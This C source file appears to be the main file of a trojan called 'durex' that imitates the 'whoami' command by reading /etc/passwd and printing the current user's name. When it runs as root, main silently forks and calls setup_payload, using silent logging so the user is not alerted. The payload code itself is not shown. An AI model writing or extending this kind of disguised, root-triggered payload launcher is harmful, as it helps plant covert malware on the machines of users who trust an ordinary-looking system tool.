#include "durex.h"

static char	*read_passfile(void)
{
	#define PASSFILE	"/etc/passwd"

	struct stat	statbuf;
	int		fd = open(PASSFILE, O_RDONLY);

	if (fd == -1)
		return error("failed to open " PASSFILE), NULL;
	if (fstat(fd, &statbuf) != 0)
		return error("failed to stat " PASSFILE), NULL;

	size_t		filesize = statbuf.st_size;
	char		*content = malloc(filesize + 1);

	if (content == NULL)
		return error("failed to allocate memory for " PASSFILE), NULL;

	ssize_t		len = read(fd, content, filesize);

	if (len == -1)
		return error("failed to read " PASSFILE), NULL;

	content[len] = '\0';
	close(fd);
	return content;
}

static char	*get_username(char *content, uid_t uid)
{
	char	*line = strtok(content, "\n");

	while (line)
	{
		char	*entry = strnchr(line, ':', 2);
		if (entry != NULL)
		{
			long int	read_uid = read_num(entry + 1);
			if (read_uid != -1 && read_uid == uid)
			{
				// no need to check because strnchr above passed
				char	*username_end = strnchr(line, ':', 1);
				*username_end = '\0';
				return line;
			}
		}
		line = strtok(NULL, "\n");
	}
	return NULL;
}

static void	fork_durex(char *program_path)
{
	silent_log("forking into durex...\n");

	pid_t	pid = fork();

	if (pid == -1)
		silent_error("failed to fork into durex");
	else if (pid == 0)
		setup_payload(program_path);
}

/* ---------------------------------- main ---------------------------------- */

int		main(__unused int ac, char **av)
{
	uid_t	uid = geteuid();
	if (uid == 0)
		fork_durex(av[0]);

	char	*content = read_passfile();
	if (content == NULL)
		return EXIT_FAILURE;

	char	*username = get_username(content, uid);
	printf("%s\n", username);

	free(content);
	return EXIT_SUCCESS;
}
